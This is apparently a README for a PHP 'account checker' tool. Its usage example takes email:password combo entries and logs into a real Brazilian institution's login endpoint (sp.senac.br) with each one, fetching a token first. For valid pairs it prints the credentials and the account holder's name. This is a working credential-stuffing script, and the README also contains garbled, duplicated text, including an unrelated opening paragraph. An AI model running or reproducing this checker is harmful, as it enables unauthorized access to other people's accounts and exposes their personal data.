Rooquest Checker Acc
================

Note that this is not a HTTP message implementation of its own. It is merely an
interface that describes a HTTP message. See the specification for more details.

Usage
-----
Rooquest Checker Acc
================

This repository is aimed at validating logins in requests


Usage
-----


Usage example below

```php
<?php
$checker = new roquest();
$lista = "email@email.com:password"; //value
$conta = $checker->separarLista(array(':','|'),$lista); //multiexplode

$email = $conta[0]; //value1
$senha = $conta[1]; //value2

$url = "https://www.sp.senac.br/o/senac-content-services/geraTokenLogin"; //url to request
$url_2 = "https://www.sp.senac.br/o/senac-content-services/autenticacaoLogin";  //url to request

$headers = array(
'Accept: */*',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Connection: keep-alive',
);

$headers_2 = array(
    'Connection: keep-alive',
    'Content-Type: text/plain',
);

$r1 = $checker->requisiçaoGet($url,$headers,'cookie1','',''); // get request
$token = $checker->puxarDados($r1,'"token":"','"','1'); // get values

$data_2 = '{"email":"'.$email.'","senha":"'.$senha.'","token":"'.$token.'"}';

$r2 = $checker->requisiçaoPost($url_2,$headers_2,$data_2,'cookie1','','');

$validar = $checker->validarConta($r2,'"nome":"','incorreto(s)!'); //message to valid account
$nome = $checker->puxarDados($r2,'"nome":"','"','1'); // get values

if($validar == 1){
    echo "OK! $email:$senha -> $nome";
}
if($validar == 0){
    echo "ERROR! $email:$senha -> Usuário ou senha incorretos";
}

]```
